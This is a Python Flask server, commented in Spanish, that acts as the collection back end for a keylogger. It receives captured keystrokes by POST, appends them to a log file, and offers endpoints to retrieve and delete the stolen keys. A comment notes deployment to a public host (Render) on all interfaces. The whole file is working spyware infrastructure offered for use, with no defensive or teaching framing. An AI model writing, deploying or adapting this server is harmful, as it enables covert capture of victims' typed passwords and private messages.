#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
API para recibir teclas del KeyLogger
Escucha en http://localhost:5000
Endpoint: POST /api/teclas
"""

from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)

# Configuración del archivo de log
ARCHIVO_LOG = "KLOG_API.txt"
RUTA_COMPLETA = os.path.join(os.path.expanduser("~"), "Documents", ARCHIVO_LOG)


@app.route('/api/teclas', methods=['POST'])
def recibir_teclas():
    """
    Endpoint para recibir teclas del keylogger
    Espera JSON: {"tecla": "contenido"}
    """
    try:
        datos = request.get_json()
        
        if not datos or 'tecla' not in datos:
            return jsonify({"error": "Falta el campo 'tecla'"}), 400
        
        tecla = datos['tecla']
        
        # Guardar en archivo
        try:
            os.makedirs(os.path.dirname(RUTA_COMPLETA), exist_ok=True)
            with open(RUTA_COMPLETA, "a", encoding="utf-8") as archivo:
                archivo.write(tecla)
        except Exception as e:
            print(f"Error escribiendo archivo: {e}")
        
        # Mostrar en consola
        print(f"[Tecla recibida] {repr(tecla)}")
        
        return jsonify({
            "estado": "exitoso",
            "tecla_recibida": tecla,
            "timestamp": datetime.now().isoformat()
        }), 200
        
    except Exception as e:
        print(f"Error procesando solicitud: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/api/status', methods=['GET'])
def status():
    """Endpoint para verificar que la API está funcionando"""
    return jsonify({
        "estado": "API KeyLogger activa",
        "archivo_log": RUTA_COMPLETA,
        "timestamp": datetime.now().isoformat()
    }), 200


@app.route('/api/teclas/limpiar', methods=['DELETE'])
def limpiar_teclas():
    """Endpoint para limpiar el archivo de log"""
    try:
        if os.path.exists(RUTA_COMPLETA):
            os.remove(RUTA_COMPLETA)
            return jsonify({"estado": "Log limpiado exitosamente"}), 200
        else:
            return jsonify({"aviso": "Archivo de log no existe"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/teclas/obtener', methods=['GET'])
def obtener_teclas():
    """Endpoint para obtener todas las teclas capturadas"""
    try:
        if not os.path.exists(RUTA_COMPLETA):
            return jsonify({"teclas": "", "cantidad": 0}), 200
        
        with open(RUTA_COMPLETA, "r", encoding="utf-8") as archivo:
            contenido = archivo.read()
        
        return jsonify({
            "teclas": contenido,
            "cantidad": len(contenido),
            "timestamp": datetime.now().isoformat()
        }), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    print("=" * 60)
    print("API KeyLogger - Iniciando...")
    print("=" * 60)
    print(f"Archivo de salida: {RUTA_COMPLETA}")
    print("Endpoint: POST http://localhost:5000/api/teclas")
    print("Status: GET http://localhost:5000/api/status")
    print("Obtener teclas: GET http://localhost:5000/api/teclas/obtener")
    print("Limpiar teclas: DELETE http://localhost:5000/api/teclas/limpiar")
    print("=" * 60)
    print("\n[*] API escuchando en puerto 5000...")
    print("[*] Esperando conexiones...\n")
    
    # En Render, usar 0.0.0.0 para escuchar en todas las interfaces
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
